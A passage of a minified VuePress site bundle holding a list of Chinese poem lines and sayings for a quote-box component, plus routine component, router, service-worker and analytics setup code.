",content:"不畏浮云遮望眼，只缘身在最高层"},{title:"清.赵翼《论诗》",content:"江山代有才人出，各领风骚数百年"},{title:"张鹏军",content:"知识这种东西，学过一遍和没学过是不一样的，我可能忘了它，但我的骨子里已经有了它"},{title:"黑塞",content:"有勇气承担命运这才是英雄好汉"},{title:"周恩来",content:"与肝胆人共事，无字句处读书"},{title:"培根",content:"阅读使人充实，会谈使人敏捷，写作使人精确"},{title:"笛卡儿",content:"阅读一切好书如同和过去最杰出的人谈话"},{title:"罗素·贝克",content:"一个人即使已登上顶峰，也仍要自强不息"},{title:"马云",content:"最大的挑战和突破在于用人，而用人最大的突破在于信任人"},{title:"雷锋",content:"自己活着，就是为了使别人过得更美好"},{title:"韩愈",content:"业精于勤，荒于嬉；行成于思，毁于随"},{title:"孔子",content:"知之者不如好之者，好之者不如乐之者"},{title:"黑格尔",content:"只有永远躺在泥坑里的人，才不会再掉进坑里\t"},{title:"普列姆昌德",content:"希望的灯一旦熄灭，生活刹那间变成了一片黑暗"},{title:"郭沫若",content:"形成天才的决定因素应该是勤奋"},{title:"洛克",content:"学到很多东西的诀窍，就是一下子不要学很多"},{title:"西班牙",content:"自己的鞋子，自己知道紧在哪里"},{title:"亚伯拉罕·林肯",content:"我这个人走得很慢，但是我从不后退"},{title:"孙洙",content:"熟读唐诗三百首，不会作诗也会吟"},{title:"周恩来",content:"为中华之崛起而读书"},{title:"朱熹",content:"问渠哪得清如许，为有源头活水来"},{title:"孔丘",content:"三军可夺帅也，匹夫不可夺志也"},{title:"拉布克",content:"懒人无法享受休息之乐"},{title:"歌德",content:"决定一个人的一生，以及整个命运的，只是一瞬之间"},{title:"屈原",content:"路漫漫其修道远，吾将上下而求索"},{title:"韩非",content:"内外相应，言行相称"},{title:"朱熹",content:"读书有三到，谓心到，眼到，口到"},{title:"苏轼",content:"古之立大事者，不惟有超世之才，亦必有坚忍不拔之志"},{title:"王阳明",content:"故立志者，为学之心也；为学者，立志之事也"},{title:"富兰克林",content:"读书是易事，思索是难事，但两者缺一，便全无用处"},{title:"培根",content:"合理安排时间，就等于节约时间"},{title:"屠格涅夫",content:"你想成为幸福的人吗？但愿你首先学会吃得起苦"},{title:"莎士比亚",content:"抛弃时间的人，时间也抛弃他"},{title:"叔本华",content:"普通人只想到如何度过时间，有才能的人设法利用时间"},{title:"拉罗什夫科",content:"取得成就时坚持不懈，要比遭到失败时顽强不屈更重要"},{title:"莎士比亚",content:"人的一生是短的，但如果卑劣地过这一生，就太长了"},{title:"池田大作",content:"不要回避苦恼和困难，挺起身来向它挑战，进而克服它"},{title:"陆游",content:"天下之事常成于困约，而败于奢靡"},{title:"常建",content:"清晨入古寺，初日照高林"},{title:"《易经》",content:"穷则变，变则通"},{title:"王勃",content:"城阙辅三秦，风烟望五津"},{title:"杜甫",content:"窗含西岭千秋雪，门泊东吴万里船"},{title:"孔子",content:"工欲善其事，必先利其器"},{title:"《史记》",content:"尺有所短，寸有所长"},{title:"《增广贤文》",content:"光阴似箭，日月如梭"},{title:"陶渊明",content:"秋月扬明晖，冬岭秀寒松"},{title:"苏轼",content:"水光潋滟晴方好，山色空蒙雨亦奇"},{title:"王维",content:"草枯鹰眼疾，雪尽马蹄轻"},{title:"卢纶",content:"月黑雁飞高，单于夜遁逃"},{title:"刘禹锡",content:"自古逢秋悲寂寥，我言秋日胜春朝"},{title:"韩愈《进学解》",content:"业精于勤，荒于嬉"},{title:"张志和",content:"青箬笠，绿蓑衣，斜风细雨不须归"},{title:"《史记》",content:"桃李不言，下自成蹊"},{title:"李商隐",content:"相见时难别亦难，东风无力百花残"},{title:"《汉书》",content:"失之毫厘，谬以千里"},{title:"杜牧",content:"借问酒家何处有，牧童遥指杏花村"},{title:"李煜",content:"春花秋月何时了，往事知多少"},{title:"陆游",content:"夜阑卧听风吹雨，铁马冰河人梦来"},{title:"王维",content:"红豆生南国，春来发几枝"},{title:"《史记》",content:"运筹帷幄之中，决胜千里之外"},{title:"晏殊",content:"无可奈何花落去，似曾相识燕归来"},{title:"《汉乐府·陌上桑》",content:"日出东南隅，照我秦氏楼"},{title:"陆游",content:"南邻更可念，布破冬未赎"},{title:"苏轼",content:"人有悲欢离合，月有阴晴圆缺"},{title:"《史记》",content:"千羊之皮，不如一狐之腋"},{title:"杜甫",content:"仲夏苦夜短，开轩纳微凉"},{title:"《论语》",content:"三军可夺帅也，匹夫不可夺志也"},{title:"孔子",content:"敏而好学，不耻下问"},{title:"《北齐书》",content:"宁为玉碎，不为瓦全"},{title:"范成大",content:"连雨不知春去，一晴方觉夏深"},{title:"刘禹锝",content:"杨柳青青江水平，闻郎江上唱歌声"},{title:"孟郊",content:"谁言寸草心，报得三春晖"},{title:"文天祥",content:"臣心一片磁针石，不指南方不肯休"},{title:"李白",content:"花间一壶酒，独酌无相亲"},{title:"朱熹",content:"百学须先立志"},{title:"《荀子》",content:"不登高山，不知天之高也；不临深溪，不知地之厚也"},{title:"李白",content:"长风破浪会有时，直挂云帆济沧海"},{title:"司马迁",content:"人固有一死，或重于泰山，或轻于鸿毛"},{title:"韩愈",content:"闻道有先后，术业有专攻"},{title:"王维",content:"山路元无雨，空翠湿人衣"},{title:"刘禹锡",content:"山不在高，有仙则名；水不在深，有龙则灵"},{title:"王维",content:"大漠孤烟直，长河落日圆"},{title:"杜甫",content:"清江一曲抱村流，长夏江村事亭幽"},{title:"《后汉书》",content:"不入虎穴，焉得虎子"},{title:"辛弃疾",content:"青山遮不住，毕竟东流去"},{title:"自居易",content:"邯郸驿里逢冬至，抱膝灯前影伴身"},{title:"杜甫",content:"晓看红湿处，花重锦官城"},{title:"杜甫",content:"国破山河在，城春草木深入"},{title:"《汉书》",content:"临渊羡鱼，不如退而结网"},{title:"《晏子春秋》",content:"智者千虑，必有一失；愚者千虑，必有一得"},{title:"杜甫",content:"天时人事日相催，冬至阳生春又来"},{title:"《论语》",content:"己所不欲，勿施于人"},{title:"曹操",content:"秋风萧瑟，洪波涌起"},{title:"王之涣",content:"白日依山尽，黄河人海流"},{title:"苏轼",content:"博观而约取，厚积而薄发"},{title:"李白",content:"举杯邀明月，对影成三人"},{title:"孟郊",content:"镜破不改光，兰死不改香"},{title:"杜甫",content:"随风潜入夜，滑物细无声"},{title:"《史记》",content:"不飞则已，一飞冲天；不鸣则已，一鸣惊人"},{title:"王勃",content:"老当益壮，宁知白首之心；穷且益坚，不坠青云之志"},{title:"《汉书》",content:"水至清则无鱼，人至察则无徒"},{title:"刘基",content:"金玉其外，败絮其中"},{title:"龚自珍",content:"落红不是无情物，化作春泥更护花"},{title:"贺知章",content:"不知细叶谁裁出，二月春风似剪刀"},{title:"《吕氏春秋》",content:"流水不腐，户枢不蠹"},{title:"卢纶",content:"林暗草惊风，将军夜引弓"},{title:"岑参",content:"北风卷地白草折，胡天八月即飞雪"},{title:"王昌龄",content:"青海长云暗雪山，孤城遥望玉门关"},{title:"孔子",content:"君子坦荡荡，小人长戚戚"},{title:"骆宾王",content:"白毛浮绿水，红掌拨清波"},{title:"《汉乐府·长歌行》",content:"常恐秋节至，煜黄华叶衰"},{title:"王维",content:"深林人不知，明月来相照"},{title:"董思恭",content:"冬尽今宵促，年开明日长"},{title:"郑板桥",content:"千磨万击还坚劲，任尔东西南北风"},{title:"岑参",content:"残云收夏暑，新雨带秋岚"},{title:"杜甫",content:"国破山河在，城春草木深"},{title:"《尚书》",content:"满招损，谦受益"},{title:"白居易",content:"力尽不知热，但惜夏日长"},{title:"王维",content:"渭城朝雨浥轻尘，客舍青青柳色新"},{title:"蒲松龄",content:"有志者，事竟成，破釜沉舟，百二秦关终属楚；苦心人，天不负，卧薪尝胆，三千越甲可吞吴"},{title:"岳飞",content:"莫等闲，白了少年头，空悲切"},{title:"王勃",content:"海内存知己，天涯若比邻"},{title:"李白",content:"桃花潭水深千尺，不及汪伦送我情"},{title:"《旧唐书》",content:"当局者迷，旁观者清"},{title:"王维",content:"空山新雨后，天气晚来秋"},{title:"刘禹锅",content:"湖光秋月两相和，潭面无风镜未磨"},{title:"卢纶",content:"欲将轻骑逐，大雪满弓刀"},{title:"杜甫",content:"且如今年冬，未休关西卒"},{title:"诸葛亮",content:"非学无以广才，非志无以成学"},{title:"《论语》",content:"发奋忘食，乐以忘优，不知老之将至"},{title:"《汉书》",content:"前车之覆，后车之鉴"},{title:"《诗经·蒹葭》",content:"所谓伊人，在水一方"},{title:"李白",content:"天门中断楚江开，碧水东流至此回"},{title:"孟浩然",content:"春眠不觉晓，处处闻啼鸟"},{title:"李白",content:"清水出芙蓉，天然去雕饰"},{title:"刘彝",content:"读万卷书，行万里路"},{title:"罗大经《鹤林玉露》",content:"绳锯木断，水滴石穿"},{title:"苏轼",content:"古之立大事者，不惟有超世之才，亦必有坚忍不拔之志"},{title:"杨万里",content:"接天莲叶无穷碧，映日荷花另样红"},{title:"王昌龄",content:"寒雨连江夜人吴，平明送客楚山孤"},{title:"王昌龄",content:"秦时明月汉时关，万里长征人未还"},{title:"王缴",content:"鸣笙起秋风，置酒飞冬雪"},{title:"李白",content:"明月出天山，苍茫云海间"},{title:"屈原",content:"路漫漫其修远今，吾将上下而求索"},{title:"柳宗元",content:"孤舟蓑笠翁，独钓寒江雪"},{title:"刘禹锡",content:"沉舟侧畔千帆过，病树前头万木春"},{title:"杜甫",content:"感时花溅泪，恨别鸟惊心"},{title:"孟子",content:"富贵不能淫，贫贱不能移，威武不能屈"},{title:"李商隐",content:"深居俯夹城，春去夏犹清"},{title:"曹操",content:"水何澹澹，山岛竦峙"},{title:"辛弃疾",content:"欲说还休，却道天凉好个秋"},{title:"《汉书》",content:"不可同日而语"},{title:"杜甫",content:"会当凌绝顶，一览众山小"},{title:"《旧唐书》",content:"木秀于林，风必摧之"},{title:"白居易",content:"日出江花红胜火，春来江水绿如蓝"},{title:"文天祥",content:"人生自古谁无死，留取丹心照汗青"},{title:"孟浩然",content:"野旷天低树，江清月近人"},{title:"孟浩然",content:"待到重阳日，还来就菊花"},{title:"高适",content:"千里黄云白日曛，北风吹雁雪纷纷"},{title:"李白",content:"欲渡黄河冰塞川，将登太行雪满山"},{title:"白居易",content:"野火烧不尽，春风吹又生"},{title:"杨万里",content:"泉眼无声惜细流，树阴照水爱晴柔"},{title:"李白",content:"相看两不厌，只有敬亭山"},{title:"张谓",content:"不知近水花先发，疑是经冬雪未销"},{title:"王之涣",content:"白日依山尽，黄河入海流"},{title:"杜甫",content:"迟日江山丽，春风花草香"},{title:"陶渊明",content:"种豆南山下，草盛豆苗稀"},{title:"《后汉书》",content:"举大事者，不忌小怨"},{title:"杜牧",content:"清明时节雨纷纷，路上行人欲断魂"},{title:"常建",content:"竹径通幽处，禅房花木深"},{title:"王维",content:"空山不见人，但闻人语响"},{title:"谢灵运",content:"首夏犹清和，芳草亦未歇"},{title:"孟浩然",content:"夜来风雨声，花落知多少"},{title:"李白",content:"小时不识月，呼作白玉盘"},{title:"杜甫",content:"好雨知时节，当春乃发生"},{title:"苏轼",content:"我欲乘风归去，又恐琼楼玉宇；高处不胜寒"},{title:"荀子",content:"锲而不舍，金石可镂"},{title:"李昂",content:"人皆苦炎热，我爱夏日长"},{title:"刘长卿",content:"柴门闻犬吠，风雪夜归人"},{title:"王安石",content:"遥知不是雪，为有暗香来"},{title:"王维",content:"风劲角弓鸣，将军猎渭城"},{title:"张志和",content:"西塞山前白鹭飞，桃花流水鳜鱼肥"},{title:"刘长舞",content:"日暮苍山远，天寒白屋贫"},{title:"李绅",content:"春种一粒粟，秋收万颗子"},{title:"《史记》",content:"失之东隅，收之桑榆"},{title:"李白",content:"举头望明月，低头思故乡"},{title:"柳宗元",content:"千山鸟飞绝，万径人踪灭"},{title:"荀子",content:"学无止境"},{title:"苏轼",content:"竹外桃花三两枝，春江水暖鸭先知"},{title:"《史记》",content:"风萧萧兮易水寒，壮士一去兮不复还"},{title:"《三国志》",content:"读书百遍，其义自现"},{title:"秦观",content:"芳菲歇去何须恨，夏木阳阴正可人"},{title:"韩婴",content:"树欲静而风不止，子欲养而亲不待也"},{title:"《汉书》",content:"百闻不如一见"},{title:"王之涣",content:"欲穷千里目，更上一层楼"},{title:"叶绍翁",content:"春色满园关不住，一枝红杏出墙来"},{title:"王维",content:"明月松间照，清泉石上流"},{title:"《孟子》",content:"穷则独善其身，达则兼善天下"},{title:"王维",content:"月出惊山鸟，时鸣春涧中"},{title:"李峤",content:"解落三秋叶，能开二月花"},{title:"陆游",content:"儿童冬学闹比邻，据岸愚懦却子珍"},{title:"苏麟",content:"近水楼台先得月，向阳花木易为春"},{title:"杜甫",content:"黄四娘家花满蹊，千朵万朵压枝低"},{title:"《后汉书》",content:"精诚所至，金石为开"},{title:"《吕氏春秋》",content:"察己则可以知人，察今则可以知古"},{title:"杜牧",content:"银烛秋光冷画屏，轻罗小扇扑流萤"},{title:"陆游",content:"山重水复疑无路，柳暗花明又一村"},{title:"《左传》",content:"人谁无过，过而能改，善莫大焉"},{title:"自居易",content:"野火烧不尽，春风吹又生"},{title:"王安石",content:"千门万户瞳瞳日，总把新桃换旧符"},{title:"苏轼",content:"不识庐山真面目，只缘身在此山中"},{title:"林则徐",content:"海纳百川，有容乃大；壁立千仞，无欲则刚"},{title:"王安石",content:"不畏浮云遮望眼，自缘身在最高层"},{title:"曹学",content:"若要功夫深，铁杵磨成针"},{title:"友人c",content:"这个世界上没有忽然崩溃的感情，只有压弯骆驼的最后一根稻草。"}];var Ao=To,Eo=Object(Ce.a)(Ao,(function(){var n=this,e=n._self._c;return e("div",{attrs:{id:"boxx"}},[e("div",{class:n.class_boxx,style:n.style_boxx},[n.show_title?e("p",{staticClass:"custom-block-title",style:n.style_title,domProps:{innerHTML:n._s(n.boxx.title)}}):n._e(),n._v(" "),n.show_content?e("p",{style:n.style_content,domProps:{innerHTML:n._s(n.boxx.content)}}):n._e()])])}),[],!1,null,null,null).exports;function _o(n){const e=document.documentElement.getBoundingClientRect(),t=n.getBoundingClientRect();return{x:t.left-e.left,y:t.top-e.top}}var Bo=[({Vue:n,options:e,router:t,siteData:a})=>{},({Vue:n})=>{n.mixin(Fe)},{},({Vue:n})=>{n.mixin({computed:{$dataBlock(){return this.$options.__data__block__}}})},{},({Vue:n})=>{n.component("BackToTop",Me)},({Vue:n})=>{n.component("Pagation",He)},({Vue:n})=>{n.mixin({computed:{$perPage:()=>10}})},({Vue:n})=>{n.component("Comments",zr),n.component("AccessNumber",Fr)},{},({Vue:n})=>{const e=Object.keys(Or).map(n=>{const e=Or[n],t="$"+n;return{[t](){const{pages:n}=this.$site;return new Lr(e,n)},["$current"+(n.charAt(0).toUpperCase()+n.slice(1))](){const n=this.$route.meta.id;return this[t].getItemByName(n)}}}).reduce((n,e)=>(Object.assign(n,e),n),{});e.$frontmatterKey=function(){const n=this["$"+this.$route.meta.id];return n||null},n.mixin({computed:e})},({Vue:n})=>{n.mixin({computed:{$pagination(){return this.$route.meta.pid&&this.$route.meta.id?this.$getPagination(this.$route.meta.pid,this.$route.meta.id):null}},methods:{$getPagination(n,e){return e=e||n,Wr.getPagination(n,e,this.$route)}}})},({Vue:n})=>{const e={$service:()=>Hr};n.mixin({computed:e})},async({router:n,isServer:e})=>{if(!e){const{register:e}=await t.e(209).then(t.bind(null,553));n.onReady(()=>{e("/service-worker.js",{registrationOptions:{},ready(){console.log("[vuepress:sw] Service worker is active."),Jr.a.$emit("sw-ready")},cached(n){console.log("[vuepress:sw] Content has been cached for offline use."),Jr.a.$emit("sw-cached",new Vr(n))},updated(n){console.log("[vuepress:sw] Content updated."),Jr.a.$emit("sw-updated",new Vr(n))},offline(){console.log("[vuepress:sw] No internet connection found. App is running in offline mode."),Jr.a.$emit("sw-offline")},error(n){console.error("[vuepress:sw] Error during service worker registration:",n),Jr.a.$emit("sw-error",n),ga("send","exception",{exDescription:n.message,exFatal:!1})}})})}},({router:n})=>{var e,t,a,r,o,i;"undefined"!=typeof window&&(e=window,t=document,a="script",r="ga",e.GoogleAnalyticsObject=r,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=1*new Date,o=t.createElement(a),i=t.getElementsByTagName(a)[0],o.async=1,o.src="https://www.google-analytics.com/analytics.js",i.parentNode.insertBefore(o,i),ga("create","UA-128189152-1","auto"),ga("set","anonymizeIp",!0),n.afterEach((function(e){ga("set","page",n.app.$withBase(e.fullPath)),ga("send","pageview")})))},({Vue:n})=>{n.component("DetailsOpenFlag",Gr)},({Vue:n})=>{n.component("musicPlayer",ko)},({Vue:n})=>{n.component("Notification",Co)},({Vue:n})=>{n.component("Boxx",Eo)},({Vue:n,router:e})=>{e.options.scrollBehavior=(e,t,a)=>{if(a)return window.scrollTo({top:a.y,behavior:"smooth"});if(!e.hash)return window.scrollTo({top:0,behavior:"smooth"});{if(n.$vuepress.$get("disableScrollBehavior"))return;const t=e.hash.slice(1),a=document.getElementById(t)||document.querySelector(`[name='${t}']`);if(a)return window.scrollTo({top:_o(a).y,behavior:"smooth"})}}},({Vue:n})=>{n.component("CodeCopy",Te)}],Io=["BackToTop","SWUpdatePopup","DetailsOpenFlag","musicPlayer","Notification"];class zo extends class{constructor(){this.store=new a.a({data:{state:{}}})}$get(n){return this.store.state[n]}$set(n,e){a.a.set(this.store.state,n,e)}$emit(...n){this.store.$emit(...n)}$on(...n){this.store.$on(...n)}}{}Object.assign(zo.prototype,{getPageAsyncComponent:Gn.e,getLayoutAsyncComponent:Gn.d,getAsyncComponent:Gn.c,getVueComponent:Gn.f});var Do={install(n){const e=new zo;n.$vuepress=e,n.prototype.$vuepress=e}};function Fo(n,e){const t=e.toLowerCase();return n.options.routes.some(n=>n.path.toLowerCase()===t)}var Oo={props:{pageKey:String,slotKey:{type:String,default:"default"}},render(n){const e=this.pageKey||this.$parent.$page.key;return Object(Gn.i)("pageKey",e),a.a.component(e)||a.a.component(e,Object(Gn.e)(e)),a.a.component(e)?n(e):n("")}},Lo={functional:!0,props:{slotKey:String,required:!0},render:(n,{props:e,slots:t})=>n("div",{class:["content__"+e.slotKey]},t()[e.slotKey])},Mo={computed:{openInNewWindowTitle(){return this.$themeLocaleConfig.openNewWindowText||"(opens new window)"}}},No=(t(401),t(402),Object(Ce.a)(Mo,(function(){var n=this._self._c;return n("span",[n("svg",{staticClass:"icon outbound",attrs:{xmlns:"http://www.w3.org/2000/svg","aria-hidden":"true",focusable:"false",x:"0px",y:"0px",viewBox:"0 0 100 100",width:"15",height:"15"}},[n("path",{attrs:{fill:"currentColor",d:"M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"}}),this._v(" "),n("polygon",{attrs:{fill:"currentColor",points:"45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"}})]),this._v(" "),n("span",{staticClass:"sr-only"},[this._v(this._s(this.openInNewWindowTitle))])])}),[],!1,null,null,null).exports),Ro={functional:!0,render(n,{parent:e,children:t}){if(e._isMounted)return t;e.$once("hook:mounted",()=>{e.$forceUpdate()})}};a.a.config.productionTip=!1,a.a.use(Jn),a.a.use(Do),a.a.mixin(function(n,e,t=a.a){!function(n){n.locales&&Object.keys(n.locales).forEach(e=>{n.locales[e].path=e});Object.freeze(n)}(e),t.$vuepress.$set("siteData",e);const r=new(n(t.$vuepress.$get("siteData"))),o=Object.getOwnPropertyDescriptors(Object.getPrototypeOf(r)),i={};return Object.keys(o).reduce((n,e)=>(e.startsWith("$")&&(n[e]=o[e].get),n),i),{computed:i}}(n=>class{setPage(n){this.__page=n}get $site(){return n}get $themeConfig(){return this.$site.themeConfig}get $frontmatter(){return this.$page.frontmatter}get $localeConfig(){const{locales:n={}}=this.$site;let e,t;for(const a in n)"/"===a?t=n[a]:0===this.$page.path.indexOf(a)&&(e=n[a]);return e||t||{}}get $siteTitle(){return this.$localeConfig.title||this.$site.title||""}get $canonicalUrl(){const{canonicalUrl:n}=this.$page.frontmatter;return"string"==typeof n&&n}get $title(){const n=this.$page,{metaTitle:e}=this.$page.frontmatter;if("string"==typeof e)return e;const t=this.$siteTitle,a=n.frontmatter.home?null:n.frontmatter.title||n.title;return t?a?a+" | "+t:t:a||"VuePress"}get $description(){const n=function(n){if(n){const e=n.filter(n=>"description"===n.name)[0];if(e)return e.content}}(this.$page.frontmatter.meta);return n||(this.$page.frontmatter.description||this.$localeConfig.description||this.$site.description||"")}get $lang(){return this.$page.frontmatter.lang||this.$localeConfig.lang||"en-US"}get $localePath(){return this.$localeConfig.path||"/"}get $themeLocaleConfig(){return(this.$site.themeConfig.locales||{})[this.$localePath]||{}}get $page(){return this.__page?this.__page:function(n,e){for(let t=0;t<n.length;t++){const a=n[t];if(a.path.toLowerCase()===e.toLowerCase())return a}return{path:"",frontmatter:{}}}(this.$site.pages,this.$route.path)}},ze)),a.a.component("Content",Oo),a.a.component("ContentSlotsDistributor",Lo),a.a.component("OutboundLink",No),a.a.component("ClientOnly",Ro),a.a.component("Layout",Object(Gn.d)("Layout")),a.a.component("NotFound",Object(Gn.d)("NotFound")),a.a.prototype.$withBase=function(n){const e=this.$site.base;return"/"===n.charAt(0)?e+n.slice(1):n},window.__VUEPRESS__={version:"1.9.10",hash:"298387a"},async function(n){const e="undefined"!=typeof window&&window.__VUEPRESS_ROUTER_BASE__?window.__VUEPRESS_ROUTER_BASE__:ze.routerBase||ze.base,t=new Jn({base:e,mode:"history",fallback:!1,routes:Ie,scrollBehavior:(n,e,t)=>t||(n.hash?!a.a.$vuepress.$get("disableScrollBehavior")&&{selector:decodeURIComponent(n.hash)}:{x:0,y:0})});!function(n){n.beforeEach((e,t,a)=>{if(Fo(n,e.path))a();else if(/(\/|\.html)$/.test(e.path))if(/\/$/.test(e.path)){const t=e.path.replace(/\/$/,"")+".html";Fo(n,t)?a(t):a()}else a();else{const t=e.path+"/",r=e.path+".html";Fo(n,r)?a(r):Fo(n,t)?a(t):a()}})}(t);const r={};try{await Promise.all(Bo.filter(n=>"function"==typeof n).map(e=>e({Vue:a.a,options:r,router:t,siteData:ze,isServer:n})))}catch(n){console.error(n)}return{app:new a.a(Object.assign(r,{router:t,render:n=>n("div",{attrs:{id:"app"}},[n("RouterView",{ref:"layout"}),n("div",{class:"global-ui"},Io.map(e=>n(e)))])})),router:t}}(!1).then(({app:n,router:e})=>{e.onReady(()=>{n.$mount("#app")})})}]);